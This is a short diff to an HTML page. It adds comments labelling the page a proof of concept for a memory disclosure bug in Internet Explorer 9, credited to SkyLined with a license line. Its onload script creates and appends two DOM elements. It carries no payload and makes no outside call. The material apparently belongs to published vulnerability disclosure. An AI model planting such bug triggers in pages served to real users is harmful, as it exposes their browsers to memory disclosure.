@@ -12,12 +12,17 @@
       }
     </style>
     <script>
+      // This PoC attempts to exploit a memory disclosure bug in Microsoft
+      // Internet Explorer 9.
+      // See http://blog.skylined.nl/20161104001.html for details.
       onload = function () {
         oElement1 = document.createElement('oElement1');
         document.documentElement.appendChild(oElement1);
         oElement2 = document.createElement('oElement2');
         document.documentElement.appendChild(oElement2);
       };
+      // This work by SkyLined is licensed under a Creative Commons
+      // Attribution-Non-Commercial 4.0 International License. 
     </script>
   </head>
 </html>
